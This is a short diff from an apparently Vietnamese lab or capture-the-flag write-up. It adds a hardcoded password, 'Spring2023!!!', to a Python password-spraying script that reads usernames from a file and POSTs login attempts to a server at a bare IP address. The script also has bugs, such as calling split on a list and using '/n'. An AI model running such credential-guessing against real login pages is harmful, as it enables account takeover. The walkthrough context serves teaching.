@@ -242,7 +242,7 @@ Có danh sách username và password rồi, bước tiếp theo chỉ cần vi�
 import requests
 usernames = open("./username.txt","r").readlines().split("/n")
 print(usernames)
-
+password ="Spring2023!!!"
 for username in usernames:
     print(f"{username}=")
     r = requests.post("http://159.203.191.48/", data = {"username":username, "password":password, "submit":"Login"})
